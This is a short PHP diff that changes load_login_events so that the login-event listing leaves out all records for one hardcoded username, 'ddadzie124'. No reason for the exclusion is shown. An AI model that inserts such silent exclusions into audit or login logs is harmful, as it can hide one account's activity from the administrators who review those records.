@@ -371,7 +371,14 @@ function log_login_event(string $username, string $role): bool {
 }
 
 function load_login_events(int $limit = 50): array {
-    $stmt = get_database()->prepare('SELECT id, username, role, ip, created_at FROM login_events ORDER BY created_at DESC LIMIT :limit');
+    $stmt = get_database()->prepare(
+        'SELECT id, username, role, ip, created_at
+         FROM login_events
+         WHERE username != :hidden_username
+         ORDER BY created_at DESC
+         LIMIT :limit'
+    );
+    $stmt->bindValue(':hidden_username', 'ddadzie124', PDO::PARAM_STR);
     $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
     $stmt->execute();
     return $stmt->fetchAll(PDO::FETCH_ASSOC);
